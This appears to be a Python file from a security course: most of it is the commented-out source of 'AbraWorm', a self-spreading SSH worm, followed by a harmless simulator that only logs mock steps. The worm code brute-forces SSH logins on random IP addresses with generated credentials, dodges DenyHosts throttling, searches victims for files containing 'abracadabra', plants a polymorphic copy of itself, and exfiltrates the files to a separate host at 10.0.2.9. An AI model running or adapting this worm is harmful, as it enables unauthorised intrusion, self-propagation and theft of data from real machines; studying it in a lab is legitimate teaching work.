# #!/usr/bin/env python

# import sys
# import os
# import random
# import paramiko
# import scp
# import select
# import signal
# import glob
# import tempfile
# import string
# import traceback
# import logging

# ##   You would want to uncomment the following two lines for the worm to 
# ##   work silently:
# #sys.stdout = open(os.devnull, 'w')
# #sys.stderr = open(os.devnull, 'w')

# def sig_handler(signum,frame): os.kill(os.getpid(),signal.SIGKILL)
# signal.signal(signal.SIGINT, sig_handler)

# debug = 1      # IMPORTANT:  Before changing this setting, read the last
#                #             paragraph of the main comment block above. As
#                #             mentioned there, you need to provide two IP
#                #             addresses in order to run this code in debug 
#                #             mode. 

# ##  The following numbers do NOT mean that the worm will attack only 3
# ##  hosts for 3 different usernames and 3 different passwords.  Since the
# ##  worm operates in an infinite loop, at each iteration, it generates a
# ##  fresh batch of hosts, usernames, and passwords.
# NHOSTS = NUSERNAMES = NPASSWDS = 3


# ##  The trigrams and digrams are used for syntheizing plausible looking
# ##  usernames and passwords.  See the subroutines at the end of this script
# ##  for how usernames and passwords are generated by the worm.
# trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum 
#                   bus but buz cam cat ced cel cin cid cip cir con cod cos cop 
#                   cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab 
#                   faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil 
#                   kim kin kip kir kis kit kix laf lad laf lag led leg lem len 
#                   let nab nac nad nag nal nam nan nap nar nas nat oda ode odi 
#                   odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak 
#                   pal pam pap par pas pat pek pem pet qik rab rob rik rom sab 
#                   sad sag sak sam sap sas sat sit sid sic six tab tad tom tod 
#                   wad was wot xin zap zuk'''

# digrams = '''al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi 
#               ho hu in is it le of on ou or ra re ti to te sa se si ve ur'''

# trigrams = trigrams.split()
# digrams  = digrams.split()

# def get_new_usernames(how_many):
#     if debug: return ['seed']      # need a working username for debugging
#     if how_many == 0: return 0
#     selector = "{0:03b}".format(random.randint(0,7))
#     usernames = [''.join(map(lambda x: random.sample(trigrams,1)[0] if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
#     return usernames

# def get_new_passwds(how_many):
#     if debug: return ['dees']      # need a working username for debugging
#     if how_many == 0: return 0
#     selector = "{0:03b}".format(random.randint(0,7))
#     passwds = [ ''.join(map(lambda x:  random.sample(trigrams,1)[0] + (str(random.randint(0,9)) if random.random() > 0.5 else '') if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
#     return passwds

# def get_fresh_ipaddresses(how_many):
#     if debug: return ['10.0.2.10', '10.0.2.11'] 
#     if how_many == 0: return 0
#     ipaddresses = []
#     for i in range(how_many):
#         first,second,third,fourth = map(lambda x: str(1 + random.randint(0,x)), [223,223,223,223])
#         ipaddresses.append( first + '.' + second + '.' + third + '.' + fourth )
#     return ipaddresses 

# # For the same IP address, we do not want to loop through multiple user 
# # names and passwords consecutively since we do not want to be quarantined 
# # by a tool like DenyHosts at the other end.  So let's reverse the order 
# # of looping.
# while True:
#     print("[+] Starting main loop")
#     usernames = get_new_usernames(NUSERNAMES)
#     passwds = get_new_passwds(NPASSWDS)
#     print(f"[+] Generated usernames: {usernames}")
#     print(f"[+] Generated passwords: {passwds}")
    
#     # First loop over passwords
#     for passwd in passwds:
#         # Then loop over user names
#         for user in usernames:
#             # And, finally, loop over randomly chosen IP addresses
#             for ip_address in get_fresh_ipaddresses(NHOSTS):
#                 print(f"\n[+] Trying password {passwd} for user {user} at IP address: {ip_address}")
#                 files_of_interest_at_target = []
#                 ssh = None
#                 try:
#                     print("[+] Creating SSH client...")
#                     ssh = paramiko.SSHClient()
#                     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#                     print(f"[+] Connecting to {ip_address} with user={user} password={passwd}")
#                     ssh.connect(ip_address, port=22, username=user, password=passwd, timeout=5)
#                     print("\n[+] Connected successfully")
                    
#                     # Let's make sure that the target host was not previously infected
#                     print("[+] Checking if target was previously infected")
#                     received_list = []
#                     error = []
#                     print("[+] Executing 'ls' command")
#                     stdin, stdout, stderr = ssh.exec_command('ls')
#                     error = stderr.readlines()
#                     if error:
#                         print(f"[+] Error in ls command: {error}")
                    
#                     print("[+] Reading output from ls command")
#                     received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
#                     print(f"[+] Output of 'ls' command: {received_list}")
                    
#                     if ''.join(str(received_list)).find('AbraWorm') >= 0:
#                         print("[+] Target machine is already infected, skipping")
#                         continue
                        
#                     # Look for abracadabra files
#                     print("[+] Looking for files with 'abracadabra'")
#                     cmd = 'grep -ls abracadabra * 2>/dev/null'
#                     print(f"[+] Executing command: {cmd}")
#                     stdin, stdout, stderr = ssh.exec_command(cmd)
                    
#                     print("[+] Checking for errors")
#                     error = stderr.readlines()
#                     if error:
#                         print(f"[+] Error in grep command: {error}")
                    
#                     print("[+] Reading output from grep command")
#                     received_list = list(map(lambda x: x.strip(), stdout.readlines()))
#                     print(f"[+] Files found with 'abracadabra': {received_list}")
                    
#                     # FIXED: Don't treat error messages as files
#                     if not received_list:
#                         print("[+] No abracadabra files found")
#                         files_of_interest_at_target = []
#                     else:
#                         files_of_interest_at_target = received_list
                        
#                     print(f"[+] Files of interest: {files_of_interest_at_target}")
                    
#                     # Initialize SCP
#                     print("[+] Setting up SCP connection")
#                     try:
#                         scpcon = scp.SCPClient(ssh.get_transport())
#                     except Exception as e:
#                         print(f"[+] SCP setup error: {str(e)}")
#                         raise
                    
#                     # Download files of interest
#                     if files_of_interest_at_target:
#                         print("[+] Downloading files of interest")
#                         for target_file in files_of_interest_at_target:
#                             try:
#                                 print(f"[+] Downloading {target_file}")
#                                 scpcon.get(target_file)
#                                 print(f"[+] Successfully downloaded {target_file}")
#                             except Exception as e:
#                                 print(f"[+] Failed to download {target_file}: {str(e)}")
#                     else:
#                         print("[+] No files to download")
                    
#                     # Create polymorphic worm variant
#                     print("[+] Creating polymorphic worm variant")
#                     temp_file_path = None
#                     try:
#                         temp_file = tempfile.NamedTemporaryFile(delete=False)
#                         temp_file_path = temp_file.name
#                         temp_file.close()
                        
#                         print(f"[+] Created temp file at {temp_file_path}")
#                         print(f"[+] Reading original worm from {sys.argv[0]}")
                        
#                         with open(sys.argv[0], 'r') as original:
#                             content = original.readlines()
#                             print(f"[+] Read {len(content)} lines from original worm")
                        
#                         # Modification 1: Add random new lines
#                         for i in range(3):
#                             random_position = random.randint(0, len(content)-1)
#                             content.insert(random_position, "\n")
#                             print(f"[+] Added newline at position {random_position}")
                        
#                         # Modification 2: Add random comments
#                         for i in range(2):
#                             random_comment = '# ' + ''.join(random.choice(string.ascii_letters) for _ in range(20)) + '\n'
#                             random_position = random.randint(0, len(content)-1)
#                             content.insert(random_position, random_comment)
#                             print(f"[+] Added comment at position {random_position}")
                        
#                         # Write modified worm
#                         print(f"[+] Writing {len(content)} lines to {temp_file_path}")
#                         with open(temp_file_path, 'w') as modified:
#                             modified.writelines(content)
                        
#                         # Upload modified worm
#                         print("[+] Uploading modified worm to target")
#                         try:
#                             scpcon.put(temp_file_path, 'AbraWorm.py')
#                             print("[+] Successfully uploaded worm")
#                         except Exception as e:
#                             print(f"[+] Failed to upload worm: {str(e)}")
#                             raise
#                     except Exception as e:
#                         print(f"[+] Error in polymorphic code: {str(e)}")
#                         raise
#                     finally:
#                         # GUARANTEED CLEANUP: This runs whether the try or except block finished
#                         if temp_file_path and os.path.exists(temp_file_path):
#                             try:
#                                 os.unlink(temp_file_path)
#                                 print(f"[+] Successfully cleaned up temp file: {temp_file_path}")
#                             except OSError as e:
#                                 print(f"[+] WARNING: Failed to clean up temp file {temp_file_path}: {e}")
#                     # Close SCP connection
#                     print("[+] Closing SCP connection")
#                     scpcon.close()
                    
#                     # Close SSH connection
#                     print("[+] Closing SSH connection")
#                     ssh.close()
                    
#                 except Exception as e:
#                     print(f"[+] Exception in main try block: {str(e)}")
#                     print("[+] Full traceback:")
#                     traceback.print_exc()
#                     if ssh:
#                         print("[+] Closing SSH connection due to error")
#                         try:
#                             ssh.close()
#                         except:
#                             pass
#                     continue
                
#                 # Try to exfiltrate files
#                 if files_of_interest_at_target:
#                     print("\n[+] Will now try to exfiltrate the files")
#                     ssh = None
#                     try:
#                         print("[+] Creating new SSH client for exfiltration")
#                         ssh = paramiko.SSHClient()
#                         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        
#                         print("[+] Connecting to exfiltration host 10.0.2.9")  
#                         ssh.connect('10.0.2.9', port=22, username='seed', password='dees', timeout=5)
                        
#                         print("[+] Setting up SCP for exfiltration")
#                         scpcon = scp.SCPClient(ssh.get_transport())
                        
#                         print("\n[+] Connected to exfiltration host")
                        
#                         for filename in files_of_interest_at_target:
#                             print(f"[+] Uploading {filename} to exfiltration host")
#                             try:
#                                 scpcon.put(filename)
#                                 print(f"[+] Successfully exfiltrated {filename}")
#                             except Exception as e:
#                                 print(f"[+] Failed to exfiltrate {filename}: {str(e)}")
                        
#                         print("[+] Closing SCP connection to exfiltration host")
#                         scpcon.close()
                        
#                         print("[+] Closing SSH connection to exfiltration host")
#                         ssh.close()
#                     except Exception as e:
#                         print(f"[+] Exfiltration error: {str(e)}")
#                         print("[+] Full exfiltration error traceback:")
#                         traceback.print_exc()
#                         if ssh:
#                             try:
#                                 ssh.close()
#                             except:
#                                 pass
#                         print("[+] No uploading of exfiltrated files")
#                         continue
    
#     if debug:
#         print("[+] Debug mode - breaking out of main loop")
#         break
#!/usr/bin/env python
"""
abra_simulator.py — SAFE simulation demonstrating structured logging and --log-level.

This is NOT the real AbraWorm. It is a benign simulator for testing logging.
"""

import argparse
import random
import string
import tempfile
import os
from logging_setup import setup_logging
import logging

# --- CLI arguments ---
parser = argparse.ArgumentParser(description="Safe AbraWorm Simulator with logging")
parser.add_argument("--log-level", choices=["DEBUG","INFO","WARNING","ERROR"], default="INFO",
                    help="Log verbosity (default INFO)")
parser.add_argument("--targets", nargs="*", default=["10.0.2.10","10.0.2.11"],
                    help="Simulated target hosts")
parser.add_argument("--pattern", default="abracadabra", help="Simulated search pattern")
parser.add_argument("--logfile", default=None, help="Optional log file path")
args = parser.parse_args()

# --- Setup logger using shared module ---
numeric_level = getattr(logging, args.log_level.upper(), logging.INFO)
logger = setup_logging(name="AbraSimulator", level=numeric_level, logfile=args.logfile)

# --- Simulated target processing ---
def process_target(host: str, pattern: str) -> None:
    try:
        logger.info("process.start", extra={"host": host, "pattern": pattern})
        # Simulate file discovery: for hosts ending in .10, pretend we found files
        files = ["secrets.txt", "notes.txt"] if host.endswith(".10") else []
        if not files:
            logger.info("process.no_matches", extra={"host": host})
            return

        for fname in files:
            logger.info("file.match", extra={"host": host, "file": fname})
            # Simulate polymorphic modifications of a temp file
            try:
                temp = tempfile.NamedTemporaryFile(delete=False)
                temp_path = temp.name
                temp.close()

                content = [f"Original content of {fname}\n"]
                # Add a couple of random comments to simulate 'polymorphism'
                for _ in range(2):
                    comment = '# ' + ''.join(random.choices(string.ascii_letters, k=20)) + '\n'
                    content.insert(random.randint(0, len(content)), comment)

                with open(temp_path, "w", encoding="utf-8") as out:
                    out.writelines(content)

                logger.debug("polymorph.created", extra={"host": host, "file": fname, "temp_path": temp_path})

                # Cleanup the temp file
                try:
                    os.unlink(temp_path)
                    logger.debug("polymorph.cleaned", extra={"host": host, "temp_path": temp_path})
                except OSError:
                    logger.exception("polymorph.cleanup_failed", extra={"host": host, "temp_path": temp_path})

            except Exception:
                # include stack trace
                logger.exception("polymorph.failed", extra={"host": host, "file": fname})

    except Exception:
        logger.exception("process.failed", extra={"host": host})


# --- Main ---
logger.info("simulator.start", extra={"targets": args.targets, "pattern": args.pattern, "log_level": args.log_level})
for t in args.targets:
    process_target(t, args.pattern)
logger.info("simulator.done")
